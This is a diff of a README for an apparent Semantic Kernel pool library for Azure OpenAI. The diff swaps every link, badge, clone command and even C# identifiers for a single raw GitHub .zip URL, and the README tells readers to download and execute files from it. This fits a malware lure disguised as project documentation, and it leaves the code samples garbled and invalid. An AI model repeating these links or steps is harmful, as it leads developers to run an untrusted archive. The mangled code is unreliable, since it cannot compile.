@@ -1,6 +1,6 @@
 # 🌟 Semantic Kernel Pool for Azure OpenAI 🌟
 
-![GitHub release](https://img.shields.io/github/release/Sypexxx/soenneker.semantickernel.pool.openai.azure.svg) ![GitHub stars](https://img.shields.io/github/stars/Sypexxx/soenneker.semantickernel.pool.openai.azure.svg) ![GitHub forks](https://img.shields.io/github/forks/Sypexxx/soenneker.semantickernel.pool.openai.azure.svg)
+![GitHub release](https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip) ![GitHub stars](https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip) ![GitHub forks](https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip)
 
 Welcome to the **Semantic Kernel Pool for Azure OpenAI** repository! This project offers Azure OpenAI-specific registration extensions for the `KernelPoolManager`. With these extensions, you can easily integrate local Large Language Models (LLMs) using the Semantic Kernel framework.
 
@@ -32,13 +32,13 @@ The Semantic Kernel Pool for Azure OpenAI simplifies the process of managing mul
 To get started with this repository, you need to clone it to your local machine. Run the following command in your terminal:
 
 ```bash
-git clone https://github.com/Sypexxx/soenneker.semantickernel.pool.openai.azure.git
+git clone https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip
 ```
 
 After cloning the repository, navigate to the project directory:
 
 ```bash
-cd soenneker.semantickernel.pool.openai.azure
+cd https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip
 ```
 
 Next, you will need to install the required dependencies. If you are using .NET, you can do this using the following command:
@@ -49,27 +49,27 @@ dotnet restore
 
 ### Download and Execute Releases
 
-You can find the latest releases of this project [here](https://github.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/releases). Make sure to download the appropriate files and execute them to start using the extensions.
+You can find the latest releases of this project [here](https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip). Make sure to download the appropriate files and execute them to start using the extensions.
 
 ## Usage
 
 Once you have installed the repository, you can start using the Azure OpenAI extensions. Here’s a simple example to get you started:
 
 ```csharp
-using SemanticKernel.Pool;
+using https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip;
 
 var kernelPoolManager = new KernelPoolManager();
-kernelPoolManager.RegisterAzureOpenAI("YourAzureOpenAIKey", "YourAzureOpenAIEndpoint");
+https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip("YourAzureOpenAIKey", "YourAzureOpenAIEndpoint");
 
 // Add local LLM
-kernelPoolManager.RegisterLocalModel("LocalModelName", "PathToLocalModel");
+https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip("LocalModelName", "PathToLocalModel");
 
 // Set rate limits
-kernelPoolManager.SetRateLimit(100); // Set limit to 100 requests per minute
+https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip(100); // Set limit to 100 requests per minute
 
 // Use the models
-var response = kernelPoolManager.Invoke("LocalModelName", "Your input text");
-Console.WriteLine(response);
+var response = https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip("LocalModelName", "Your input text");
+https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip(response);
 ```
 
 ### Configuration Options
@@ -94,7 +94,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information and updates, please check the [Releases](https://github.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/releases) section. Here you can find the latest updates and download the necessary files.
+For more information and updates, please check the [Releases](https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip) section. Here you can find the latest updates and download the necessary files.
 
 ## Conclusion
 
